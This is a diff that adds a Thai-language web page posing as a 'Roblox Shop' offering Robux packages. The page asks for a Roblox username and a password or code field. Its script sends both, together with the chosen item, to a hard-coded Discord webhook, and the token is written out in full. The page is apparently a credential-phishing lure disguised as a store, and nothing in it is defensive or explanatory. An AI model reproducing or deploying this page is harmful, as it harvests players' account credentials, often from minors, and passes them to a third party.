@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Roblox Shop</title>
+
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial, sans-serif;
+}
+
+body{
+background:#121417;
+color:white;
+display:flex;
+justify-content:center;
+align-items:center;
+min-height:100vh;
+padding:20px;
+}
+
+.box{
+background:#1b1f24;
+width:100%;
+max-width:420px;
+padding:30px;
+border-radius:18px;
+box-shadow:0 0 25px rgba(0,0,0,0.4);
+text-align:center;
+}
+
+.logo-img{
+width:90px;
+height:90px;
+object-fit:contain;
+margin-bottom:12px;
+}
+
+.logo{
+font-size:32px;
+font-weight:900;
+margin-bottom:5px;
+letter-spacing:1px;
+}
+
+.sub{
+color:#9ca3af;
+margin-bottom:25px;
+font-size:14px;
+}
+
+input,select{
+width:100%;
+padding:14px;
+margin-bottom:14px;
+background:#2a2f36;
+border:none;
+border-radius:10px;
+color:white;
+font-size:15px;
+outline:none;
+}
+
+input::placeholder{
+color:#9ca3af;
+}
+
+button{
+width:100%;
+padding:14px;
+border:none;
+border-radius:10px;
+background:#335fff;
+color:white;
+font-size:17px;
+font-weight:bold;
+cursor:pointer;
+transition:0.2s;
+}
+
+button:active{
+transform:scale(0.97);
+}
+
+.footer{
+margin-top:18px;
+font-size:12px;
+color:#777;
+text-align:center;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+
+<img class="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Roblox_Logo_2022.jpg">
+
+<div class="logo">ROBLOX</div>
+<div class="sub">สั่งซื้อสินค้าเกม Roblox</div>
+
+<input type="text" id="name" placeholder="ชื่อ Roblox">
+
+<input type="text" id="code" placeholder="รหัส">
+
+<select id="item">
+<option>เลือกสินค้า</option>
+<option>ROBUX 100R 7วัน</option>
+<option>ROBUX 200R 14วัน</option>
+</select>
+
+<button onclick="sendOrder()">ส่งออเดอร์</button>
+
+<div class="footer">Powered by Roblox Shop</div>
+
+</div>
+
+<script>
+function sendOrder(){
+
+let name = document.getElementById("name").value;
+let code = document.getElementById("code").value;
+let item = document.getElementById("item").value;
+
+fetch("https://discord.com/api/webhooks/1503016107747836085/w_-d73cGkgq3F5kdFLnKc7WRM2EvIRElu8Wo9oth_m4P7rNIurmnuHhcCk5AbRpWIfPE",{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+content:"📦 มีออเดอร์ใหม่\n👤 ชื่อ: "+name+"\n🔑 รหัส: "+code+"\n🛒 เลือก: "+item
+})
+});
+
+alert("ส่งออเดอร์แล้ว");
+
+}
+</script>
+
+</body>
+</html>
